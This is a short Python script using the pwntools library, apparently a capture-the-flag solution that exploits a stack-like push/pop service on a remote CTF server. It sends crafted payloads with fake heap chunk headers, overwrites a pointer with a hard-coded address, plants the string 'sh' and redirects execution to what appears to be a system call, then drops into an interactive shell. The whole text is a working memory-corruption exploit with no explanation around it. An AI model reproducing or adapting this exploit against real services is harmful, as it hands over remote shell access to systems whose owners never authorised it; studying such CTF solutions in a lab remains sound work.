from pwn import *

#r = remote('localhost',8888)
r = remote('csie.ctf.tw',10152)

r.send('push\n65\ndeadbeef\n')
r.send('pop\n')
r.send('pop'.ljust(96)+p64(0)+p64(0x61)+p64(0)+p64(0x402110)+'\n')
r.send('push\n88\n'+'A'*0x50+'\x28\x20\x40\x00\x00\x00\x00')
r.send('sh\0'.ljust(8)+p64(0x400730)+'\n')
r.interactive()
